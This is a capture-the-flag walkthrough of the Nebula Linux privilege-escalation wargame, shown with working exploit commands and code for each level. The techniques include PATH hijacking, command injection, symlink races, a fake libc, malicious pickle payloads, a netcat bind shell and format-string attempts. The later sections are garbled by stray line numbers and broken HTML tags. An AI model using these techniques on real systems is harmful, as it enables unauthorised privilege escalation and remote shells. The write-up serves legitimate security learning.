---
title:  "[CTF] Nebula Wargame Walkthrough"
---

![Logo](/assets/images/nebula.jpg)

## Overview

Recently at work someone introduced a modified version of the [Nebula](https://exploit-exercises.com/nebula/) wargame.  The goal of the game is local privilege escalation on a Linux machine (a virtual machine is provided). It's very interesting and covers many areas: SUID files, race conditions, format string vulnerabilities, library manipulations, etc. It comprises 20 levels and solutions to some of them are already posted on different sites. Keep in mind that many levels can be solved in different ways. So here's mine.

## Level 0
The instructions here are pretty clear: _find a Set User ID program that will run as the "flag00" account"_.
```bash
level00@nebula:~$ find / -user flag00 -type f -executable 2>/dev/null
/bin/.../flag00
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 1
The source code for a vulnerable SUID binary is presented. The programs run 'echo' command, without specifying its full path:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
So we build a custom executable, and run the vulnerable binary with `PATH` environment variable modified:. 
Create test.c file with the following content:
```c
int main(int argc, char **argv, char **envp)
{
  system("/bin/getflag");
}
```

Compile, run an get the flag:
```
level01@nebula:~$ gcc -o echo test.c
level01@nebula:~$ PATH=/home/level01 /home/flag01/flag01
You have successfully executed getflag on a target account
```

## Level 2
Another source code is presented for a vulnerable program that may allow arbitrary programs to be executed. The _USER_ environment variable is used as input for the echo command, but unsanitized:
```c
[..]
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
```

So we could use an injection trick. We'll pass something like **`"levelx; /bin/getflag"`** :
```bash
level02@nebula:~$ USER="levelx; /bin/getflag" /home/flag02/flag02
about to call system("/bin/echo levelx; /bin/getflag is cool")
levelx
You have successfully executed getflag on a target account
```

## Level 3
We're informed that _there is a crontab that is called every couple of minutes_.  The script called is *__/home/flag03/writable.sh__*. This script parses the _`writable.d`_ directory, and tests all files if they are executable (and executes them! - _bash -x) ). So we'll build a small script, place it in the writable directory and wait.for the crontab to execute it:
```bash
level03@nebula:~$ vim /home/flag03/writable.d/scr
#!/bin/bash
getflag > /tmp/out
level03@nebula:~$ chmod +x /home/flag03/writable.d/scr
level03@nebula:~$ cat /tmp/out
You have successfully executed getflag on a target account
```

## Level 4
The goal here is to read the *__/home/flag04/token__* file from the SUID binary _/home/flag04/flag04_. But there is a check that prevents opening any file that has the string "token" in its name. A symbolic link solves this:
```bash
level04@nebula:~$ ln -s /home/flag04/token /tmp/tk
level04@nebula:~$ /home/flag04/flag04 /tmp/tk
06508b5e-8909-4f38-b630-fdb148a848a2
This token can then be used to log in as flag04 user.
```

## Level 5
The hint here is to check flag05 home directory, looking for week permissions. Indeed, the hidden _.backup_ directory is readable by everyone, and contains the RSA public and private keys of flag05 user. We extract the archive into ~/.ssh,  and because we have the private key, we will be able to login through ssh as flag05:
```bash
level05@nebula:~$ tar xvf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh flag05@localhost
```
This [article](https://www.debian.org/devel/passwordlessssh) describes key0based SSH authentication, and warns about leaving the passphrase empty: __*anybody getting your private key (~/.ssh/id_rsa) will be able to connect to the remote host*__.

## Level 6
For this level, _The flag06 account credentials came from a legacy unix system_. We see that the password for flag06 user is *__DES encrypted, and stored unshadowed directly__* in the /etc/passwd file:
```bash
level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

[John the Ripper](http://www.openwall.com/john/) decrypts it instantaneously:
```
~ echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > passwd
~ john.exe passwd
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (flag06)
```

## Level 7
This level presents a vulnerable Perl script. The vulnerability lies in using the input __*Host*__ variable unsanitized, and can be exploited through an injection similar to level2:
```perl
@output = `ping -c 3 $host 2>&1`;
```

```bash
level07@nebula:/home/flag07$ wget http://localhost:7007/index.cgi?Host=%3b%20getflag%20%3E%20/tmp/out07
level07@nebula:/home/flag07$ cat /tmp/out07
You have successfully executed getflag on a target account
```
[URL encoding](http://meyerweb.com/eric/tools/dencoder/) is used above to pass the **_;_**, **_>_** and blank characters encoded.

## Level 8
This presents a small capture to be analysed.  It proves to be a clear-text login to a Linux box, stored in the _capture.pcap_ file. We extract the stream (_Follow TCP stream_ option  in Wireshark), and open it with a hex editor. Then we see the password as __backdoor[\x7F][\x7F][\x7F]00Rm8[\x7F]ate__. 0x7F is the ASCII code of delete key. So the reconstructed password for flag08 user is: **backd00Rmate**.

## Level 9
The _/home/flag09/flag09_ executable is a SUID wrapper over the presented vulnerable PHP code. The vulnerability lies in using the __e (PREG_REPLACE_EVAL)__ modifier with [preg_replace](http://php.net/manual/en/function.preg-replace.php) function. As noted [here](http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php),  __*Use of this modifier is discouraged, as it can easily introduce security vulnerabilites*__.

The C wrapper runs the vulnerable script, which in turn parses the content to format email addresses. When an address is matched, the 'spam' function will be executed, having as input the matched string. We'll alter this, so that the email contains the [PHP system command](http://php.net/manual/en/function.system.php), with the script as parameter (_$filename_, as it is in the  'markup' function). The idea is the same as with the vulnerable code example from [`PREG_REPLACE_EVAL warnings`](http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php):
```bash
level09@nebula:~$ vim /tmp/scr
[email {${system($filename)}}]
getflag > /tmp/out09
level09@nebula:~$ chmod +x /tmp/scr
level09@nebula:~$ /home/flag09/flag09 /tmp/scr
level09@nebula:~$ cat /tmp/out09
You have successfully executed getflag on a target account
```

## Level 10
The task here is to read the __*/home/flag10/token*__ file, using the vulnerable flag10 binary. The flow is as follows: the program checks if its first argument is a readable file (the token file is readable only for _flag10/flag10_), and if it is, tries to connect to a remote host and send the file. This is a clear example of a [Time-of-Check, Time-of-Use (TOCTOU)](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) vulnerability. We could easily trick it to send us an unreadable file.

### Method 1
* Create a world readable file in /tmp
* Start the script with this file as parameter. It will block on connect function
* Replace the file created in step 1 with a link to the token file
* Open the socket on the other side and receive the content of the file
```bash
$ touch /tmp/test
$ /home/flag10/flag10 /tmp/test localhost &
$ rm /tmp/test; ln -sf /home/flag10/token /tmp/test
c:\> nc -l -p 18211
```

### Method 2
In a scenario I had nebula VM, network in bridged mode, and _connect()_ call was non blocking, and timed out immediately. So the first method didn't work. The TOCTOU vulnerability can be still exploited. I've done the scenario created by Matt Andreko, with the exception that I've not used two machines, but just the nebula VM. More detailed explanation [here](http://www.mattandreko.com/2011/12/exploit-exercises-nebula-10.html). In 4 terminals:
* An infinite loop to append received output to a file:
```bash
$ while :; do nc.traditional -l -p 18211 >> out.txt; done
```
* An infinite loop (**-f** switch) to search for the banner in the received file:
```bash
$ tail -f out.txt | grep -v ".oO Oo."
```
* An infinite loop to replace */tmp/token10* link with a readable file and alternatively with the token file:
```bash
$ touch /tmp/token
$ while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; done
```
* Continuously start the flag10 binary with a low priority (-n 20), in an infinite loop, connecting to localhost:
```bash
$ while :; do nice -n 20 /home/flag10/flag10 /tmp/token10 127.0.0.1; done
```
* Eventually we'll get the token in the second terminal: _615a2ce1-b2b5-4c76-8eed-8aa5c4015c27_. We can use it to login as flag10 user.

## Level 11
Level 11 presents a C program that 'decrypts' an input buffer and passes the result to the system command to be executed.  The encryption algorithm is simple, but entertaining to reverse.  I've built a python script to encrypt any command, so that it will be decrypted correctly by this algorithm and executed. (The documentation is the code).
?
1
2
3
level11@nebula:~$ python gen.py | TEMP=/tmp /home/flag11/flag11
level11@nebula:~$ cat /tmp/out11
You have successfully executed getflag on a target account
Level 12
We're informed that there's a backdoor listening on port 50001. There's a LUA script that binds the port and asks for a password, /home/flag12/flag12.lua. The vulnerability to be exploited here is in the popen() function,  that is executed with the unsanitized password as an input. We take advantage of this and slip in a command instead of the password:
?
1
2
3
4
5
level12@nebula:~$ nc.traditional 127.0.0.1 50001
Password: `getflag > /tmp/flag12`
Better luck next time
level12@nebula:~$ cat /tmp/flag12
You have successfully executed getflag on a target account
Level 13
The program to be exploited here checks if the real user id of the calling process (obtained with the getuid() call)  has a specific value and, if  the condition is true, prints the token for flag10 user. The check can be bypassed by starting the program in gdb, set a breakpoint before the comparison, and when hit, modify the user id value to be compared to the one required:
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
gdb /home/flag13/flag13
(gdb) set logging on
(gdb) disas main
Dump of assembler code for function main:
  [ . . .]   
  0x080484ed <+41>: xor    %eax,%eax
  0x080484ef <+43>: call   0x80483c0 <getuid@plt> // call to getuid()
  0x080484f4 <+48>: cmp    $0x3e8,%eax  // comparison
Quit
(gdb) break *080484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) c
Continuing.
Your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 2114) exited with code 063]
</getuid@plt>
Level 14
We're presented a readable file with encrypted content, and the encryption program. We have the ability to chose arbitrary texts to be encrypted and see the corresponding cipher text (chosen plain text attack). It's simple, I won't ruin the fun of discovering how it works. With this python script, I've  'deciphered' the token:
?
1
2
$python dec.py `cat /home/flag14/token`
8457c118-887c-4e40-a5a6-33a25353165
Level 15
This level instructs us to strace the suid binary corresponding to flag15, and links to instructions on how to compile libraries in Linux (static, shared, loadable). Doing as suggested, first thing we see is that the program tries to load libc library from a non-standard path in the world-readable /var/tmp folder:
?
1
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory).
By disassembling the program in GDB, we see it's using the puts() function (from glibc) to print some instructions on screen.
?
1
2
3
4
5
gdb /home/flag15/flag15
(gdb) disas main
. . .
0x08048340 <+16>:    call   0x8048300 <puts@plt>
</puts@plt>
So we will create a fake library in the path above, where the program searches for libraries, containing this puts() function, but with our code. We we'll also need a Makefile for easier compilation and a version script file. It is important to link in libc static library when compiling our fake library, to get access to system calls (-Bstatic, -staic options from below). All the files mentioned are also here. The fake library source code:
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
#include <stdio.h>
#include <stdlib.h>
#include <sys syscall.h="">
 
// .. to avoid symbol undefined errors
void __cxa_finalize(void * d) {
}
 
int puts(const char *s) {
 system("/bin/getflag > /tmp/out15");
  
 return 0;
}
 
// libc wrapper to call main
int __libc_start_main(int (*main) (int, char **, char **), 
 int argc, 
 char **argv, 
 void (*init) (void), 
 void (*fini) (void), 
 void (*rtld_fini) (void), 
 void (* stack_end)
) {
 main(argc, argv, NULL);
  
 return 0;
}
</sys></stdlib.h></stdio.h>
And the Makefile: 
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
FAKELIB=/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6
FAKEOBJ=libc.o
FAKESRC=libc.c
VER_SCRIPT=version.script
 
all: $(FAKESRC)
 gcc -Wall -fPIC -o $(FAKEOBJ) -c $(FAKESRC)
 gcc -shared -Wl,-Bstatic,--version-script=$(VER_SCRIPT),-soname,libc.so.6 -o $(FAKELIB) $(FAKEOBJ) -static
 
clean:
 rm $FAKEOBJ
 
cleanall:
 rm *.o *.c $(VER_SCRIPT) 
Putting them together, we can execute any command, with flag15 privileges:
?
1
2
3
4
5
6
level15@nebula:~$ mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov
level15@nebula:~$ /home/flag15/flag15
Segmentation fault
level15@nebula:~$ cat /tmp/out15
You have successfully executed getflag on a target account
level15@nebula:~$
Level 16
We have another vulnerable Perl script listening on port 1616. This script forms a command to be executed based on unsanitized user input - $username variable:
?
1
2
3
$username =~ tr/a-z/A-Z/; # conver to uppercase
$username =~ s/\s.*//;  # strip everything after a space
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
The $username variable is first converted to uppercase and everything after a blank space is trimmed. So we have to inject a command there taking into account these restrictions. The solution is taken from here, with small modifications.
We create a script (with its name in uppercase) and place it in the /tmp folder, where the flag16 user (the owner of thttpd process) can access it. 
?
1
2
$ ps aux |grep -i  httpd | grep flag16
flag16 736  0.0 0.2 2460 712 ?  Ss   09:34   0:00 /usr/sbin/thttpd -C /home/flag16/thttpd.conf
To execute it, we use a feature of bash that searches file names containing replacement characters. An example clarifies this: 
?
1
2
3
4
5
6
7
8
level16@nebula:~$ mkdir -p dir1/dir2/dir3/dir4
level16@nebula:~$ touch dir1/dir2/dir3/dir4/MYSCRIPT
level16@nebula:~$ ls /*/*/*/*/*/*/MYSCRIPT
/home/level16/dir1/dir2/dir3/dir4/MYSCRIPT
level16@nebula:~$ ls /*/*/*/dir?/*/*/MYSCRIPT
/home/level16/dir1/dir2/dir3/dir4/MYSCRIPT
level16@nebula:~$ ls /*/*/d?r1/*/*/*/MYSCRIPT
/home/level16/dir1/dir2/dir3/dir4/MYSCRIPT
So taking advantage of this neat feature we create the file MYSCRIPT in /tm folder, and execute it with /*/SCRIPT (all uppercase).  We need the traditional version of netcat, not the OpenBSD variant, to have access to execute (-e) feature. Putting all together, we have: 
?
1
2
3
4
5
6
7
8
9
10
11
12
13
level16@nebula:~$ vim /tmp/SCRIPT:
#!/bin/sh
nc.traditional -l -p 4444 -e /bin/sh
level16@nebula:~$ chmod +x /tmp/SCRIPT
 
> nc nebula 1616
GET /index.cgi?username="`/*/SCRIPT`"&password=pass
 
> nc 192.168.0.18 4444
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account
Level 17
Level 17 deals with an interesting yet dangerous feature of Python, the ability to pickle (and unpickle) binary objects. The following vulnerable line unpickles an object from an unsanitized input read through a socket:
?
1
2
line = skt.recv(1024)
obj = pickle.loads(line)
It is clearly mentioned in a big red warning on the pickle module site that "The pickle module is not intended to be secure against erroneous or maliciously constructed data.  Never unpickle data received from an untrusted or unauthenticated source."
I've used two methods to construct a malicious pickled object and pass it to loads() function.
Method 1
This site shows some very simple constructed pickled objects that execute code when unpickled. Exactly what's needed here: 
?
1
2
3
4
5
6
7
8
9
10
11
$ touch ~/pickled
cos
system
(S'getflag > /tmp/out17'
tR.
 
$ cat pickled | nc localhost 10007
Accepted connection from 127.0.0.1:53001
^C
level17@nebula:~$ cat /tmp/out17
You have successfully executed getflag on a target account
Method 2
We will understand how exactly pickling works and construct our own objects with any desired unpickling behavior. An object can define a __reduce__ method, that will be called at pickle time, and that returns a callable object (a function) and its arguments. This callable object will be executed at unpickling to construct the initial version of the object. So we could easily create a class with a __reduce__() method returning some executable malicious code. More on how to exploit pickle here.
The exploit class looks like this: 
?
1
2
3
4
5
6
7
8
9
10
import pickle
import os
  
class Exploit(object):
  def __reduce__(self):
    return (os.system,
            (('getflag > /tmp/out_exp'),))
    
dmp = pickle.dumps(Exploit())
print dmp
And I've used it like this: 
?
1
2
3
4
5
level17@nebula:~$ python exploit.py  | nc 127.0.0.1 10007
Accepted connection from 127.0.0.1:53002
^C
level17@nebula:~$ cat /tmp/out_exp
You have successfully executed getflag on a target account
Nice. Any command can be embedded this way.
Level 18
Here we have a vulnerable C program and we're told there are 3 ways to exploit it: an easy way, an intermediate way and a more difficult/unreliable way. First some things that didn't work (for me) and need further investigation
There is a possible buffer overflow in the code that parses the input for the 'setuser' command:
?
1
2
char msg[128];
sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
But if we try to exploit it, there's a Fortify check in place, that would need to be bypassed (how?): 
?
1
2
3
4
$ echo setuser `perl -e 'print "A"x200'` | /home/flag18/flag18
*** buffer overflow detected ***: /home/flag18/flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6ff8d5]
Another thing I've noticed is the format strings vulnerability in the function that processes the 'site exec' commands: 
?
1
2
3
4
5
void notsupported(char *what)
{
...
   dprintf(what);
}
This seems to be a subtle reference to SITE EXEC format string vulnerability in WU-FTPD 2.6.0. We  confirm this: 
?
1
2
3
$ /home/flag18/flag18 -d deb -vvv
site exec %s%s%s%s%s%s%s%s%s%s%s%s
Segmentation fault
But after analysing and crafting a payload to modify addresses (based on the great reference book by Jon Erickson, Hacking - The Art of Exploitation 2nd edition), I realized there's another Fortify protection that doesn't allow %n format parameter (seems that this could also by bypassed as described by Captain Planet in Phrack magazine). 
?
1
2
3
level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
*** %n in writable segment detected ***
Aborted
The same protection restrict the overwriting of destructor method: 
?
1
2
3
4
5
6
7
8
9
10
level18@nebula:~$ nm /home/flag18/flag18 | grep DTOR
0804af20 D __DTOR_END__
0804af1c d __DTOR_LIST__
level18@nebula:~$ objdump -s -j .dtors /home/flag18/flag18
/home/flag18/flag18:     file format elf32-i386
Contents of section .dtors:
 804af1c ffffffff 00000000                    ........
level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
*** %n in writable segment detected ***
Aborted
No luck (something more than luck needed:) with these methods. We have forgotten the mentioned 'easy' way. As it was previously described here, the login() function opens a file, but never closes it, and in the case where the file couldn't be opened (maximum opened files reached), it will still set the globals.loggedin variable, that will allow to execute shell afterwards. So we will fill all the available file descriptors, after that close the file descriptor for the debug log (to free one file descriptor, otherwise we won't be able to execute out command that needs a file descriptor to open).
We check for the maximum allowed opened files: 
?
1
2
3
level18@nebula:~$ ulimit -a 
[. . .]
open files                      (-n) 1024
Extracting the steps from the mentioned reference, we have: 
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
level18@nebula:~$ for i in {0..1030}; do echo "login test" >> /tmp/input; done
level18@nebula:~$ echo "closelog" >> /tmp/input
level18@nebula:~$ echo "shell" >> /tmp/input
level18@nebula:~$ echo "/bin/getflag" > /tmp/Starting
level18@nebula:~$ chmod +x /tmp/Starting
PATH=/tmp:$PATH cat /tmp/input |/home/flag18/flag18 --init-file -d /tmp/debuglog
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'n'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 't'
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
<b>You have successfully executed getflag on a target account</b>
/tmp/debuglog: line 2: syntax error near unexpected token `('
/tmp/debuglog: line 2: `logged in successfully (without password file)'
Nice 
Level 19
This presents a program that executes a command only if its parent is the root process.  We can start flag19 binary from another process, then terminate the calling parent process before execve() in the child, without waiting for it, so the child becomes 'orphan'. An orphan process is a process whose parent process has finished or terminated, though it remains running itself. In a Unix-like operating system any orphaned process will be immediately adopted by the special init system process. This operation is called re-parenting and occurs automatically. The init process is started under the root username.
Source of the calling process:
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
/* 
Credit: http://chrismeyers.org/2012/05/01/nebula-level-19/
 */
#include <unistd.h>     /* Symbolic Constants */
#include <sys types.h="">  /* Primitive System Data Types */
#include <errno.h>      /* Errors */
#include <stdio.h>      /* Input/Output */
#include <sys wait.h="">   /* Wait for Process Termination */
#include <stdlib.h>     /* General Utilities */
 
int main() {
    pid_t childpid; /* variable to store the child's pid */
    int retval;     /* child process: user-provided return code */
    int status;     /* parent process: child's exit status */
 
    childpid = fork();
 
    if (childpid >= 0) { // success
        if (childpid == 0) {    // child
            char cmd[] = "/home/flag19/flag19";
            char *argv[] = { "/bin/sh", "-c", "/bin/getflag > /home/flag19/test" };
            char *envp[] = { NULL };
            sleep(3);
            execve(cmd, argv, envp); // the parent has already terminated by now
 
        } else {    // parent
            //waitpid(childpid, &status, 0);
            sleep(1);
            exit(1);
        }
    }
}
</stdlib.h></sys></stdio.h></errno.h></sys></unistd.h>
Executing it: 
?
1
2
3
4
5
6
level19@nebula:~$ ps aux | grep -i init
root         1  0.0  0.7   3188  1772 ?        Ss   Jul13   0:03 /sbin/init
level19@nebula:~$ gcc start.c
level19@nebula:~$ ./a.out
level19@nebula:~$ cat /home/flag19/test
You have successfully executed getflag on a target account

All the levels are very instructive, heading for the next ones in Protostar.
